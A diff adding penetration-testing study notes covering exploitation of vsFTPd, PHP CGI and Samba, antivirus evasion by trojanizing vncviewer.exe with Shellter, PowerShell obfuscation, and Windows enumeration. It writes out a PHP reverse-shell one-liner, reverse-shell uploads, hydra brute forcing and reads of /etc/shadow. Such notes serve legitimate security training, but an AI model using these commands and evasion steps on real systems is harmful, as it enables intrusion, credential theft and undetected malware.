@@ -1016,5 +1016,183 @@ cat /etc/*release
 ```
 
 **Targeting vsFTPd**
+```
+ftp 1.1.1.1 21
+> Name: anonymous
+searchsploit vsftpd
+> copy python exploit and nano to change code if needed
+> exploit can be patched, blocking backdoor, and rendering exploit useless
+nmap -sV -p 25 1.1.1.1
+search smtp_enum
+> user "service" is interesting
+hydra -l service -P .../unix_users.txt 1.1.1.1 ftp
+ftp 1.1.1.1 21
+> access to files, but can't run all commands
+> check 1.1.1.1/dav and upload reverse shell
+cp /usr/share/webshells/php/php-reverse-shell.php .
+> nano and change ip and port to own ip and open port e.g., 1234
+
+> in ftp
+cd dav
+put shell.php
+nc -nvlp 1234
+> in browser find the uploaded shell
+```
+
+**Targeting PHP**
+```
+> in browser, 1.1.1.1/phpinfo.php to check versions
+searchsploit php cgi
+> copy php cgi argument injection exploit and modify pwn code
+<?php $sock=fsockopen("hostip",1234);exec("/bin/sh -i <&4 >&4 2>&4");?>
+python2 18836.py 1.1.1.1 80
+```
+
+**Targeting SAMBA**
+```
+nmap -sV -p 445 1.1.1.1
+nc -nv 1.1.1.1 445
+> banner grabbing, use msfconsole
+search smb_version
+searchsploit samba 3.0.20
+search samba 3.0.20
+> usermap_script
+sessions -u 1
+
+cat /etc/shadow
+cat /etc/passwd
+```
+
+### Obfuscation
+**AV Evasion with Shellter**
+AV Software typically use signature, heuristic and behavior based detection.
+AV evasion techniques:
+- On-disk evasion techniques
+	- obfuscation
+	- encoding
+	- packing
+	- crypters
+- In-Memory evasion techniques
+	- manipulation of memory, inject payload into a process through Windows APIs, execute payload in memory in a separate thread.
+
+Shellter project.
+```
+sudo apt-get install shellter -y
+sudo dpkg --add-architecture i386
+sudo apt-get install wine32
+cd /usr/share/windows-resources/shellter
+sudo wine shellter.exe
+> Create a copy of a legitimate executable. 
+Operation mode: A
+PE Target: /home/kali/Desktop/AVBypass/vncviewer.exe
+Enable Stealth mode: y
+Use a listed payload: L 1
+
+sudo python3 -m http.server 80
+
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+
+> get vncviewer in Windows machine through on hosted httpserver, and see that it evades AV.
+```
+
+**Obfuscating PowerShell Code**
+Invoke-Obfuscation is an open source PowerShell command and script obfuscator.
+```
+git clone ...danielbohannon/Invoke-Obfuscation
+sudo apt-get install powershell -y
+pwsh
+cd Invoke-Obfuscation
+Import-Module ./Invoke-Obfuscation.psd1
+Invoke-Obfuscation
+> Copy PowerShell code from PayloadsAllTheThings cheat sheet and change IP. Save as shell.ps1
+SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
+ENCODING
+1
+SET SCRIPTPATH ...shell.ps1
+BACK
+
+AST
+ALL
+1
+> Save output as obfuscated.ps1 and transfer over to target system. E.g., host a http server, set up netcat listener and run with PowerShell on Windows target.
+```
+
+# Post-Exploitation
+## Introduction
+Depends on what kind of access you have to the system, and how stealthy you need to be. Must abide with rules of engagement agreed with the client.
+Privilege escalation, maintaining persistent access, clearing tracks.
+
+**Methodology**
+- Local enumeration
+    - system information, users and groups, network information, services, automation
+- Transferring files
+    - web server with Python, transfer to Windows and Linux
+- Upgrading shells
+    - meterpreter, TTY
+- Privilege escalation
+    - identifying privesc vulns on Windows and Linux
+- Persistence 
+    - Windows and Linux
+- Dumping and cracking hashes
+    - Windows and Linux
+- Pivoting
+    - internal network recon, pivoting
+- Clearing tracks
+    - Windows and Linux
+
+## Windows Enumeration
+**Enumerating System Information - Windows**
+Hostname, OS Name, OS Build & Service Pack, OS Architecture, Installed updates/Hotfixes.
+```
+nmap -sV 1.1.1.1
+searchsploit rejetto
+search rejetto
+
+getuid
+sysinfo
+
+shell
+hostname
+systeminfo
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+cd C:\\Windows\System32
+cat eula.txt
+> file might not exist
+```
+
+**Enumerating Users & Groups - Windows**
+Current user & privileges, additional user information, other users on the system, groups, members of the built-in administrator group.
+```
+getuid
+getprivs
+
+search logged_on
+set SESSION 1
+run
+
+shell
+whoami
+whoami /priv
+query user
+net users
+net user administrator
+net localgroup
+net localgroup administrators
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
